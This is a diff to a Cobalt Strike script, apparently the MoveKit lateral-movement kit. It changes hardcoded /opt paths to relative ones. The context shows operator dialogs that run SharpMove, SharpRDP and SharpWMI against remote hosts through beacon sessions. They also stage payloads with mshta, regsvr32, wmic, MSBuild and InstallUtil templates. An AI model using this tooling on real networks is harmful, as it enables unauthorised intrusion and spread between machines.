@@ -4,7 +4,9 @@
 # by: @0xthirteen
 #
 #
-
+#
+# Paths modified from original version for use with cobalt_strike_extension_kit
+#
 
 #---------------------------------------------
 #Misc Execution
@@ -83,7 +85,7 @@ sub moveDialogs::wmi{
 		binput($bid, "SharpMove SharpWMI Execution");
 		btask($bid, 'Executing SharpWMI');
 		btask($bid, "Executing $3['command']$3['query'] against $3['computername']");
-		bexecute_assembly!($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/SharpMove.exe"), $sharparg);
+		bexecute_assembly!($bid, script_resource("exe/SharpMove.exe"), $sharparg);
 	}));
 	dialog_description($dialog, "Custom WMI command or query");
 	drow_beacon($dialog, "bid", "Session: ");
@@ -133,7 +135,7 @@ sub moveDialogs::dcom{
 		binput($bid, "SharpMove SharpDCOM Execution");
 		btask($bid, 'Executing SharpDCOM');
 		btask($bid, "Executing $3['command'] against $3['computername']");
-		bexecute_assembly!($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/SharpMove.exe"), $sharparg);
+		bexecute_assembly!($bid, script_resource("exe/SharpMove.exe"), $sharparg);
 	}));
 	dialog_description($dialog, "Custom DCOM command Execution");
 	drow_beacon($dialog, "bid", "Session: ");
@@ -184,7 +186,7 @@ sub moveDialogs::taskschedule{
 		binput($bid, "SharpMove SharpTaskScheduler Execution");
 		btask($bid, 'Executing SharpTaskScheduler');
 		btask($bid, "Executing $3['command'] against $3['computername']");
-		bexecute_assembly!($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/SharpMove.exe"), $sharparg);
+		bexecute_assembly!($bid, script_resource("exe/SharpMove.exe"), $sharparg);
 	}));
 	dialog_description($dialog, "Custom Scheduled Task Execution");
 	drow_beacon($dialog, "bid", "Session: ");
@@ -235,7 +237,7 @@ sub moveDialogs::scm{
 		binput($bid, "SharpMove SharpSCM Execution");
 		btask($bid, 'Executing SharpSCM');
 		btask($bid, "Executing $3['command'] against $3['computername']");
-		bexecute_assembly!($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/SharpMove.exe"), $sharparg);
+		bexecute_assembly!($bid, script_resource("exe/SharpMove.exe"), $sharparg);
 	}));
 	dialog_description($dialog, "Custom Service Execution");
 	drow_beacon($dialog, "bid", "Session: ");
@@ -288,7 +290,7 @@ sub moveDialogs::rdp{
 		binput($bid, "SharpMove SharpRDP Execution");
 		btask($bid, 'Executing SharpRDP');
 		btask($bid, "Executing $3['command'] against $3['computername']");
-		bexecute_assembly!($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/SharpRDP.exe"), $sharparg);
+		bexecute_assembly!($bid, script_resource("exe/SharpRDP.exe"), $sharparg);
 	}));
 	dialog_description($dialog, "Custom RDP Command Execution");
 	drow_beacon($dialog, "bid", "Session: ");
@@ -338,7 +340,7 @@ sub moveDialogs::modifyscheduledtask{
 		binput($bid, "SharpMove Modify-SharpTaskScheduler Execution");
 		btask($bid, 'Executing Modify-SharpTaskScheduler');
 		btask($bid, "Executing $3['command'] against $3['computername']");
-		bexecute_assembly!($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/SharpMove.exe"), $sharparg);
+		bexecute_assembly!($bid, script_resource("exe/SharpMove.exe"), $sharparg);
 	}));
 	dialog_description($dialog, "Modify Existing Scheduled Task Execution");
 	drow_beacon($dialog, "bid", "Session: ");
@@ -389,7 +391,7 @@ sub moveDialogs::modifyservice{
 		binput($bid, "SharpMove Modify-SharpService Execution");
 		btask($bid, 'Executing Modify-SharpService');
 		btask($bid, "Executing $3['command'] against $3['computername']");
-		bexecute_assembly!($bid, script_resource("/opt/cobalt_strike_extension_kit/exe/SharpMove.exe"), $sharparg);
+		bexecute_assembly!($bid, script_resource("exe/SharpMove.exe"), $sharparg);
 	}));
 	dialog_description($dialog, "Modify Existing Service binpath Execution");
 	drow_beacon($dialog, "bid", "Session: ");
@@ -460,7 +462,7 @@ sub moveDialogs::mshta_cmd{
 		$payloadtype = "raw";
 		$compile = "false";
 		$descname = "MSHTA-Command Lateral Movement";
-		$exectemplate = "/opt/cobalt_strike_extension_kit/exe/mshta.hta";
+		$exectemplate = "mshta.hta";
 		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, "", $3['location'], $3['computername'], "file", "cmd", $3['auto']);
 
 		#Can't used env vars
@@ -495,7 +497,7 @@ sub moveDialogs::regsvr32_cmd{
 		$payloadtype = "raw";
 		$compile = "false";
 		$descname = "RegSvr32-Command Lateral Movement";
-		$exectemplate = "/opt/cobalt_strike_extension_kit/exe/regsvr32.sct";
+		$exectemplate = "regsvr32.sct";
 		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, "", $3['location'], $3['computername'], "file", "cmd", $3['auto']);
 		
 		#Can't used env vars
@@ -530,7 +532,7 @@ sub moveDialogs::wmic_cmd{
 		$payloadtype = "raw";
 		$compile = "false";
 		$descname = "WMIC-Command Lateral Movement";
-		$exectemplate = "/opt/cobalt_strike_extension_kit/exe/wmic.xsl";
+		$exectemplate = "wmic.xsl";
 		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, "", $3['location'], $3['computername'], "file", "cmd", $3['auto']);
 		
 		#Can't used env vars
@@ -568,7 +570,7 @@ sub moveDialogs::msbuild{
 		$payloadtype = "raw";
 		$compile = "false";
 		$descname = "MSBuild Lateral Movement";
-		$exectemplate = "/opt/cobalt_strike_extension_kit/exe/msbuild.csproj";
+		$exectemplate = "msbuild.csproj";
 		$opts = $3;
 		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
 		#Can't used env vars
@@ -614,7 +616,7 @@ sub moveDialogs::installutil{
 		$payloadtype = "raw";
 		$compile = "true";
 		$descname = "InstallUtil Lateral Movement";
-		$exectemplate = "/opt/cobalt_strike_extension_kit/exe/installutil.cs";
+		$exectemplate = "installutil.cs";
 		$opts = $3;
 		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
 		#Can't used env vars
@@ -661,7 +663,7 @@ sub moveDialogs::mshta_file{
 		$payloadtype = "raw";
 		$compile = "false";
 		$descname = "MSHTA Lateral Movement";
-		$exectemplate = "/opt/cobalt_strike_extension_kit/exe/mshta.hta";
+		$exectemplate = "mshta.hta";
 		$opts = $3;
 		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
 		#Can't used env vars
@@ -705,7 +707,7 @@ sub moveDialogs::regsvr32_file{
 		$payloadtype = "raw";
 		$compile = "false";
 		$descname = "RegSvr32 Lateral Movement";
-		$exectemplate = "/opt/cobalt_strike_extension_kit/exe/regsvr32.sct";
+		$exectemplate = "regsvr32.sct";
 		$opts = $3;
 		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
 		#Can't used env vars
@@ -750,7 +752,7 @@ sub moveDialogs::wmic_file{
 		$payloadtype = "raw";
 		$compile = "false";
 		$descname = "WMIC Lateral Movement";
-		$exectemplate = "/opt/cobalt_strike_extension_kit/exe/wmic.xsl";
+		$exectemplate = "wmic.xsl";
 		$opts = $3;
 		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
 
@@ -796,7 +798,7 @@ sub moveDialogs::custom_nonprebuilt{
 		$payloadtype = "raw";
 		$compile = "true";
 		$descname = "NonPreBuiltCustom Lateral Movement";
-		$exectemplate = "/opt/cobalt_strike_extension_kit/exe/custom-nonpre.cs";
+		$exectemplate = "custom-nonpre.cs";
 		$opts = $3;
 		&moveKit::prechecks($3['bid'], $3['listener'], $descname, $2, $3['droptype'], $3['location'], $3['computername'], $3['filename'], $3['cmdtrigger'], $3['auto']);
 
